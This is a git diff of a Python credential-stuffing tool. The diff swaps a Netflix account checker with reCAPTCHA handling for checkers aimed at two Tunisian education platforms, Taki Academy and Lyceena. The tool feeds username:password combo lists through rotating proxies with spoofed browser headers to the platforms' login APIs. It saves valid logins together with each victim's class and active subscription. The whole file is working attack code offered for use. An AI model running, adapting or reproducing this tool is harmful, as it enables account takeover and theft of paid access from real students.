@@ -1,18 +1,13 @@
 import httpx
-import json
 import random
 import asyncio
 import os
 import sys
 from colorama import Fore, init
 import datetime
-import asyncio
-import json
-import subprocess
-from websockets.asyncio.server import serve
-from websockets.exceptions import ConnectionClosedOK
-from websockets.asyncio.server import ServerConnection
 from pathlib import Path
+from urllib.parse import quote
+import time
 
 init(autoreset=True)
 
@@ -20,49 +15,180 @@ stop_event = asyncio.Event()
 TOKEN_EVENT = asyncio.Event()
 LOCK = asyncio.Lock()
 COMBOS = asyncio.Queue()
-
-SESSIONS = {}  # Store sessions by proxy
-SESSION_LOCK = asyncio.Lock()
-
-async def extract_initial_cookies(client):
-    """Extract initial cookies before login"""
-    try:
-        # Visit Netflix main page to get initial cookies
-        response = await client.get("https://www.netflix.com")
-        cookies = {}
-        for cookie in client.cookies.jar:
-            cookies[cookie.name] = cookie.value
-        return cookies
-    except Exception as e:
-        return {}
+PROXIES = []
 
 
-
-
-websocket_client = None
-TOKEN = ""
 checked = 0
 hits = 0
-PROXIES = []
-HOST = "localhost"
-PORT = 3001
-DNS_PATH = "dns_resolver.py"
-HTML_DIR = "./www"
-HTTP_PORT = 80
 
 
-hits_filename = Path("hits").joinpath(datetime.datetime.now().strftime(f"%d-%m-%Y %H;%M;%S") + ".txt")
+hits_filename = Path("hits").joinpath(
+    datetime.datetime.now().strftime(f"%d-%m-%Y %H;%M;%S") + ".txt"
+)
 
 
+async def taki_thread(PROXIES: list, COMBOS: asyncio.Queue, debug: bool):
 
-async def netflix_thread(PROXIES, COMBOS: asyncio.Queue, verbose):
-
-    global checked, hits, TOKEN, websocket_client
+    global checked, hits
     while True:
         try:
             combo = COMBOS.get_nowait()  # non-blocking
         except asyncio.QueueEmpty:
-            break  # exit if queue is empty
+            return  # return if queue is empty
+        try:
+            username, password = combo.split(":", 1)
+        except Exception:
+            print(Fore.RED + f"[FAIL] {combo} | bad combo format")
+            async with LOCK:
+                checked += 1
+            COMBOS.task_done()
+            continue
+        proxy_url = None
+        if PROXIES:
+            proxy_url = build_proxies(random.choice(PROXIES))
+
+        headers = {
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "Origin": "https://app.takiacademy.com",
+            "Referer": "https://app.takiacademy.com/",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en,ar;q=0.9",
+            "Sec-Ch-Ua-Platform": '"Windows"',
+            "Priority": "u=1, i",
+            "Sec-Ch-Ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-site",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+        }
+
+        while True:  # retry loop
+            try:
+
+                async with httpx.AsyncClient(
+                    proxy=proxy_url, timeout=30, verify=False, headers=headers
+                ) as client:
+
+                    payload = {
+                        "username": username,
+                        "password": password,
+                        "g-recaptcha-response": "",
+                    }
+                    try:
+                        result = await client.post(
+                            "https://api.takiacademy.com/api/auth/login_check",
+                            headers=headers,
+                            json=payload,
+                        )
+                        raw = safe_json(result)
+                        if not raw:
+                            print(Fore.RED + "[!] Token Not Found Error !")
+                            async with LOCK:
+                                checked += 1
+                            break
+                        if raw["message"] == "Authentication Success":
+                            token = raw.get("payload", {}).get("token")
+                            if not token:
+                                async with LOCK:
+                                    checked += 1
+                                continue
+                            headers = {
+                                "Content-Type": "application/json",
+                                "Accept": "application/json",
+                                "Origin": "https://app.takiacademy.com",
+                                "Referer": "https://app.takiacademy.com/",
+                                "Accept-Encoding": "gzip, deflate, br, zstd",
+                                "Accept-Language": "en,ar;q=0.9",
+                                "Sec-Ch-Ua-Platform": '"Windows"',
+                                "Priority": "u=1, i",
+                                "Sec-Ch-Ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                                "Sec-Fetch-Dest": "empty",
+                                "Sec-Fetch-Mode": "cors",
+                                "Sec-Fetch-Site": "same-site",
+                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+                                "Authorization": f"Bearer {token}",
+                            }
+                            res = await client.get(
+                                "https://api.takiacademy.com/api/auth/me",
+                                headers=headers,
+                            )
+                            raw = safe_json(res)
+                            if not raw:
+                                async with LOCK:
+                                    checked += 1
+                                continue
+                            affiliations = []
+                            user_info = raw.get("payload", {}).get("user", {})
+
+                            optional_subject = (
+                                user_info.get("optional_subject") or {}
+                            ).get("name", "No subject")
+                            classe = (user_info.get("division") or {}).get(
+                                "name", "No classe"
+                            )
+
+                            affiliations = []
+                            active = False
+                            for x in user_info.get("affiliations") or []:
+                                if x.get("active") or False:
+                                    active = True
+                                    affiliations.append(
+                                        x.get("group", {}).get(
+                                            "name", "No subscription Name"
+                                        )
+                                    )
+                                    break
+
+                            if active:
+                                if debug:
+                                    print(
+                                        Fore.GREEN
+                                        + f"[+] login successful with {combo}  !"
+                                    )
+                                else:
+                                    print(Fore.GREEN + "[+] login successful  !")
+                                save_hit(
+                                    username,
+                                    password,
+                                    classe,
+                                    optional_subject,
+                                    affiliations,
+                                )
+                                async with LOCK:
+                                    hits += 1
+                            else:
+                                if debug:
+                                    print(
+                                        Fore.YELLOW
+                                        + f"[!] not an active user with {combo}  !"
+                                    )
+                                else:
+                                    print(Fore.YELLOW + "[+] user not active   !")
+                        elif debug:
+                            print(Fore.RED + f"[!] login failed with {combo}  !")
+                            break
+                        break
+                    except httpx.RequestError:
+                        print(Fore.RED + f"[FAIL] {combo} [retrying... in 1s]")
+                        await asyncio.sleep(1)
+                        continue
+                    finally:
+                        async with LOCK:
+                            checked += 1
+                        COMBOS.task_done()
+            except httpx.ProxyError as e:
+                print(Fore.RED + f"[!] Proxy error: {e}")
+                break
+
+
+async def lycena_thread(PROXIES: list, COMBOS: asyncio.Queue, debug: bool):
+    global checked, hits
+    while True:
+        try:
+            combo = COMBOS.get_nowait()  # non-blocking
+        except asyncio.QueueEmpty:
+            return  # return if queue is empty
         try:
             username, password = combo.split(":", 1)
         except Exception:
@@ -74,147 +200,191 @@ async def netflix_thread(PROXIES, COMBOS: asyncio.Queue, verbose):
 
         proxy_url = None
         if PROXIES:
-            proxy_url = build_proxy_url(random.choice(PROXIES))
-        headers = {"Accept": "application/json"}
-        async with httpx.AsyncClient(
-            proxy=proxy_url, timeout=30, verify=False, headers=headers
-        ) as client:
+            proxy_url = build_proxies(random.choice(PROXIES))
 
-            res = await client.get(
-                "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location"
-            )
+        headers = {
+            "Content-Type": "application/json",
+            "Accept": "*/*",
+            "Origin": "https://student.lyceena.tn",
+        }
 
-            country_iso_code = safe_json(res).get("country")
 
-            res = await client.get(
-                f"https://restcountries.com/v3.1/alpha/{country_iso_code}"
-            )
-            country_data = safe_json(res)
-            if country_data and len(country_data) > 0:
-                idd = country_data[0].get("idd")
-                country_code = idd.get("root") + idd.get("suffixes")[0]
-            else:
-                country_code = "US"
-            async with LOCK:
-                await websocket_client.send(json.dumps({"action": "send"}))
-            await TOKEN_EVENT.wait()
-            async with LOCK:
-                recaptcha = TOKEN
-            payload = {
-                "operationName": "CLCSScreenUpdate",
-                "variables": {
-                    "format": "HTML",
-                    "imageFormat": "PNG",
-                    "locale": f"en-{country_iso_code}",
-                    "serverState": '{"realm":"growth","name":"LOGIN","clcsSessionId":"603d0ad3-3efb-4b43-aba3-1451ce8af7a7","sessionContext":{"session-breadcrumbs":{"funnel_name":"loginWeb"}}}',
-                    "serverScreenUpdate": '{"realm":"custom","name":"login.with.userLoginId.and.password","metadata":{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},"loggingAction":"Submitted","loggingCommand":"SubmitCommand","referrerRenditionId":"69c7d5b5-bc42-4425-b451-00b8399f1fe4"}',
-                    "inputFields": [
-                        {
-                            "name": "userLoginId",
-                            "value": {"stringValue": username},
-                        },
-                        {"name": "password", "value": {"stringValue": password}},
-                        {"name": "countryCode", "value": {"stringValue": country_code}},
-                        {
-                            "name": "countryIsoCode",
-                            "value": {"stringValue": country_iso_code},
-                        },
-                        {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(100,500)}},
-                        {
-                            "name": "recaptchaResponseToken",
-                            "value": {"stringValue": recaptcha},
-                        },
-                    ],
-                },
-                "extensions": {
-                    "persistedQuery": {
-                        "id": "75fbc994-0c3b-462c-8558-f73fd869e5b9",
-                        "version": 102,
-                    }
-                },
-            }
-            headers = {"Content-Type": "application/json", "Accept": "application/json"}
+        try:
 
-            try:
+            async with httpx.AsyncClient(
+                proxy=proxy_url, timeout=30, verify=False, headers=headers
+            ) as client:
+
+                payload = {
+                    "returnSecureToken": True,
+                    "email": username,
+                    "password": password,
+                    "clientType": "CLIENT_TYPE_WEB",
+                }
+
                 result = await client.post(
-                    "https://web.prod.cloud.netflix.com/graphql",
+                    "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyAI6_GRBwYVq93IQO33cIuaTaev7XOYgMY",
                     headers=headers,
                     json=payload,
                 )
                 raw = safe_json(result)
-                all_text = str(raw)
-
-                if (
-                    ("Incorrect password " not in all_text)
-                    and ("alert-message-header" not in all_text)
-                    and ("sign in" not in all_text)
-                ):
+                if not raw:
+                    print(Fore.RED + "[!] Token Not Found Error !")
+                    # async with LOCK:
+                    #     checked += 1
+                    return
+                token = raw["idToken"] or ""
+                if token:
                     
-                    if verbose:
-                        print(Fore.GREEN + f"[+] login successful with {combo}  !")
-                    else :
-                        print(Fore.GREEN + "[+] login successful  !")
-                    save_hit(username, password)
-                    async with LOCK:
-                        checked += 1
-                        hits += 1
-                elif verbose:
+                    headers["Authorization"] = f"Bearer {token}"
+                    res = await client.get(
+                        "https://api-back.lyceena.tn/api/users/getMyCourses",
+                        headers=headers,
+                    )
+                    raw = safe_json(res)
+                    if not raw:
+                        async with LOCK:
+                            checked += 1
+                        return
+                    affiliations = [""]
+                    user_info = raw.get("studentFound", {})
+                    
+                    optional_subject = user_info.get("option", "No subject")
+
+                    classe = user_info.get(
+                        "niveau", "No classe"
+                    ) + " " + user_info.get("branche", "")
+
+                    # affiliations = []
+                    # active = False
+                    # for x in user_info.get("affiliations") or []:
+                    #     if x.get("active") or False:
+                    #         active = True
+                    #         affiliations.append(
+                    #             x.get("group", {}).get(
+                    #                 "name", "No subscription Name"
+                    #             )
+                    #         )
+                    #         break
+
+                    active = True
+
+                    if active:
+                        if debug:
+                            print(
+                                Fore.GREEN
+                                + f"[+] login successful with {combo}  !"
+                            )
+                        else:
+                            print(Fore.GREEN + "[+] login successful  !")
+                        save_hit(
+                            username,
+                            password,
+                            classe,
+                            optional_subject,
+                            affiliations,
+                        )
+                        async with LOCK:
+                            hits += 1
+                    else:
+                        if debug:
+                            print(
+                                Fore.YELLOW
+                                + f"[!] not an active user with {combo}  !"
+                            )
+                        else:
+                            print(Fore.YELLOW + "[+] user not active   !")
+                elif debug:
                     print(Fore.RED + f"[!] login failed with {combo}  !")
-                    async with LOCK:
-                        checked += 1
-                else:
-                    async with LOCK:
-                        checked += 1
-            except httpx.RequestError:
-                async with LOCK:
-                    print(Fore.RED + f"[FAIL] {combo} [retrying...]")
-                continue
-            finally:
-                COMBOS.task_done()
+                    return
+        except httpx.RequestError as e:
+            print(Fore.RED + f"[FAIL] Request error: {e}")
+        finally:
+            async with LOCK:
+                checked += 1
+            COMBOS.task_done()
 
 
-def save_hit(username, password):
+def save_hit(username, password, classe, optional_subject, affiliations):
+    subs = " / ".join(affiliations or [])
     with open(hits_filename, "a", encoding="utf-8") as f:
-        f.write(f"{username}:{password}\n")
+        f.write(
+            f"{username}:{password}      |  classe: '{classe}'   |  subject: '{optional_subject}' | subsriptions: {subs} \n"
+        )
 
 
-def safe_json(res):
+def safe_json(res) -> str | None:
     try:
         return res.json()
     except Exception:
         return None
 
 
-def build_proxy_url(line: str):
+def build_proxies(proxy: str):
     """
-    Normalize common proxy formats to a URL usable by httpx.
-    Examples accepted:
+    Normalize one proxy string for httpx.
+    Supports:
       - ip:port
       - ip:port:user:pass
       - user:pass@ip:port
-      - http://..., https://..., socks5://...
-    Returns a string or None if it can't normalize.
+      - http://ip:port, socks4://ip:port, socks5://ip:port, etc.
+    Returns:
+      a string usable by httpx.AsyncClient(proxy=...)
+      or None if invalid.
     """
-    if not line:
+    if not proxy or not isinstance(proxy, str):
         return None
-    line = line.strip()
-    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
-        return line
-    if "@" in line and ":" in line:
-        return "http://" + line if not line.startswith("http") else line
-    parts = line.split(":")
-    if len(parts) == 2:
-        host, port = parts
-        return f"http://{host}:{port}"
+
+    s = proxy.strip()
+
+    # Already has full scheme
+    if s.lower().startswith(
+        ("http://", "https://", "socks4://", "socks5://", "socks://")
+    ):
+        return s  # just return the string
+
+    def pick_scheme(host: str, port: str | None):
+        if (
+            port in ("1080", "9050")
+            or "socks" in host.lower()
+            or host.lower().startswith("tor")
+        ):
+            return "socks5"
+        return "http"
+
+    # user:pass@ip:port
+    if "@" in s:
+        userinfo, hostpart = s.rsplit("@", 1)
+        if ":" in hostpart:
+            host, port = hostpart.rsplit(":", 1)
+        else:
+            host, port = hostpart, None
+        scheme = pick_scheme(host, port)
+        if ":" in userinfo:
+            user, pwd = userinfo.split(":", 1)
+            return f"{scheme}://{quote(user)}:{quote(pwd)}@{host}:{port}"
+        else:
+            return f"{scheme}://{quote(userinfo)}@{host}:{port}"
+
+    # ip:port:user:pass
+    parts = s.rsplit(":", 3)
     if len(parts) == 4:
         host, port, user, pwd = parts
-        return f"http://{user}:{pwd}@{host}:{port}"
+        scheme = pick_scheme(host, port)
+        return f"{scheme}://{quote(user)}:{quote(pwd)}@{host}:{port}"
+
+    # ip:port
+    if len(parts) == 2:
+        host, port = parts
+        scheme = pick_scheme(host, port)
+        return f"{scheme}://{host}:{port}"
+
     return None
 
 
-async def checker():
+async def main():
     global PROXIES, COMBOS
-    await asyncio.sleep(1)
+
     print(
         r"""
     _        _______ _________ _______           _______  _______  _        _______  _______ 
@@ -226,7 +396,7 @@ async def checker():
     | )  \  || (____/\   | |   | (____/\| )   ( || (____/\| (____/\|  /  \ \| (____/\| ) \ \__
     |/    )_)(_______/   )_(   (_______/|/     \|(_______/(_______/|_/    \/(_______/|/   \__/
                                                                             
-        Netflix [1]         (comming soon...) by ahmed mbarek
+        taki academy [1], lycena academy [2]         (comming soon...) by ahmed mbarek
 
 
 """
@@ -241,7 +411,7 @@ async def checker():
 
     CHECKER_TYPE = input("> ")
 
-    while CHECKER_TYPE not in ["1"]:
+    while CHECKER_TYPE not in ["1", "2"]:
         print(Fore.YELLOW + "[!] command is not found !")
         CHECKER_TYPE = input("> ")
     CHECKER_TYPE = int(CHECKER_TYPE)
@@ -269,7 +439,7 @@ async def checker():
         THREADS_COUNT = int(input("threads [default:100]: ") or 100)
     except:
         THREADS_COUNT = 100
-    verbose = input("you want to use verbose mode (Y/N) : ").strip().upper() == "Y"
+    debug = input("you want to use debug mode (Y/N) : ").strip().upper() == "Y"
 
     with open("combos.txt", "r", encoding="utf-8") as f:
         for line in f:
@@ -281,78 +451,23 @@ async def checker():
     match (CHECKER_TYPE):
         case 1:
             tasks = [
-                asyncio.create_task(netflix_thread(PROXIES, COMBOS, verbose))
+                asyncio.create_task(taki_thread(PROXIES, COMBOS, debug))
                 for _ in range(THREADS_COUNT)
             ]
-            await COMBOS.join()  # wait for all combos to be processed
+        case 2:
+            tasks = [
+                asyncio.create_task(lycena_thread(PROXIES, COMBOS, debug))
+                for _ in range(THREADS_COUNT)
+            ]
+        case _:
+            sys.exit(3)
+
+    await COMBOS.join()
 
     print(Fore.CYAN + f"Done!,  Checked {checked}/{combos_size} | Hits={hits}")
     stop_event.set()
 
 
-async def websocket_main():
-    async with serve(handle_client, HOST, PORT):
-        print(f"🚀 WebSocket server running on ws://{HOST}:{PORT}")
-
-        # Start both subprocesses concurrently
-        dns_task = asyncio.create_task(run_dns_resolver())
-        http_task = asyncio.create_task(run_http_server())
-
-        await stop_event.wait()  # wait for signal
-
-        await asyncio.gather(dns_task, http_task)
-
-
-async def run_dns_resolver():
-    """Run dns_resolver.py as a subprocess."""
-    process = await asyncio.create_subprocess_exec(
-        "python",
-        DNS_PATH,
-        stdout=asyncio.subprocess.DEVNULL,
-        stderr=asyncio.subprocess.DEVNULL,
-    )
-    print(f"🧩 Started process: {DNS_PATH} (pid={process.pid})")
-
-
-async def run_http_server():
-    """Run a simple HTTP server to serve ./html/"""
-    process = await asyncio.create_subprocess_exec(
-        "python",
-        "-m",
-        "http.server",
-        str(HTTP_PORT),
-        "--directory",
-        HTML_DIR,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    print(f"🌐 HTTP server running at http://localhost:{HTTP_PORT} (pid={process.pid})")
-
-
-async def handle_client(websocket: ServerConnection):
-    global websocket_client, TOKEN
-    websocket_client = websocket
-    print("🔗 Client connected")
-    try:
-        async for message in websocket:
-            try:
-                data = json.loads(message)
-                recaptcha = data.get("token")
-                if recaptcha:
-                    async with LOCK:
-                        TOKEN = recaptcha
-                        TOKEN_EVENT.set()
-            except json.JSONDecodeError:
-                ...
-    except ConnectionClosedOK:
-        print("🔌 Client disconnected gracefully")
-    except Exception as e:
-        print(f"⚠️ Unexpected error: {e}")
-
-
-async def main():
-    await asyncio.gather(websocket_main(), checker())
-
-
 if __name__ == "__main__":
     asyncio.run(main())
+    input(Fore.RED + "[-] press enter to exit > ")
